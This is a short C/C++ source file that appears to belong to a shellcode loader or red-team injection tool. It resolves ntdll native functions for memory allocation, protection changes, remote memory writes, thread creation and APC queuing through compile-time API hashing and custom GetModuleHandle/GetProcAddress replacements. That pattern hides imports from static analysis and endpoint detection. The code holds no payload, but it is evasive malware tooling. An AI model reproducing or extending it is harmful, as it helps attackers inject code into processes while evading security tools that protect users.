#include "apiHashing.h"
#include "declare.h"
#include "customDyn.h"
#include "apiHashing.cpp"

CTIME_HASHA(NtAllocateVirtualMemory);
CTIME_HASHA(NtProtectVirtualMemory);
CTIME_HASHA(NtWriteVirtualMemory);
CTIME_HASHA(NtCreateThreadEx);
CTIME_HASHA(NtQueueApcThread);
CTIME_HASHA(NtResumeThread);
CTIME_HASHA(NtTestAlert);
CTIME_HASHA(NtDelayExecution)
CTIME_HASHA(NtQueryInformationProcess)


fnNtAllocateVirtualMemory virtualAlloc;
fnNtProtectVirtualMemory virtualProtect;
fnNtWriteVirtualMemory virtualMemoryWrite;
fnNtCreateThreadEx createThread;
fnNtQueueApcThread queueApc;
fnNtResumeThread resumeThread;
fnNtTestAlert NtTestAlert;
fnNtDelayExecution NtDelayExecution;
fnNtQueryInformationProcess QueryInformationProcess;

int DynamicDeclare()
{
	HMODULE ntdll = GetModuleHandleReplacement(L"NTDLL.DLL");

	virtualAlloc = (fnNtAllocateVirtualMemory)GetProcAddressReplacement(ntdll, NtAllocateVirtualMemory_Rotr32A);
	virtualProtect = (fnNtProtectVirtualMemory)GetProcAddressReplacement(ntdll, NtProtectVirtualMemory_Rotr32A);
	virtualMemoryWrite = (fnNtWriteVirtualMemory)GetProcAddressReplacement(ntdll, NtWriteVirtualMemory_Rotr32A);
	createThread = (fnNtCreateThreadEx)GetProcAddressReplacement(ntdll, NtCreateThreadEx_Rotr32A);
	queueApc = (fnNtQueueApcThread)GetProcAddressReplacement(ntdll,NtQueueApcThread_Rotr32A);
	resumeThread = (fnNtResumeThread)GetProcAddressReplacement(ntdll,NtResumeThread_Rotr32A);
	NtTestAlert = (fnNtTestAlert)GetProcAddressReplacement(ntdll, NtTestAlert_Rotr32A);
	NtDelayExecution = (fnNtDelayExecution)GetProcAddressReplacement(ntdll, NtDelayExecution_Rotr32A);
	QueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddressReplacement(ntdll, NtQueryInformationProcess_Rotr32A);
	return 0;

}